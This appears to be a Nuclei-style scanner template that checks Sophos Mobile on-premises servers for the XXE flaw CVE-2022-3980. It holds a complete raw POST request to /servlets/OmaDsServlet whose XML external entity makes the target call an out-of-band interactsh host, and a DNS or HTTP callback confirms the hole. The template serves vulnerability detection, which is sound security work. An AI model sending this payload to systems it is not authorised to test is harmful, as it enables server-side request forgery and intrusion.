id: sophos-mobile-xxe_CVE-2022-3980

info:
  name: XEE vulnerability in Sophos Mobile managed on-premises
  author: dabla
  severity: critical
  description: Checks exeecution of XXE Payload via dns canary
  reference: https://www.sophos.com/en-us/security-advisories/sophos-sa-20221116-smc-xee
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-611
    cve-id: CVE-2022-3980
  tags: xxe,ssrf

http:
  - raw:
      - |
        POST /servlets/OmaDsServlet HTTP/1.1
        Host: {{Hostname}}
        Content-Type: "application/xml"

        <?xml version="1.0"?>
        <!DOCTYPE cdl [<!ENTITY % test SYSTEM "http://{{interactsh-url}}">%test;]>
        <cdl>test</cdl>

    redirects: true
    max-redirects: 3

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        name: http
        words:
          - "http"

      - type: word
        part: interactsh_protocol
        name: dns
        words:
          - "dns"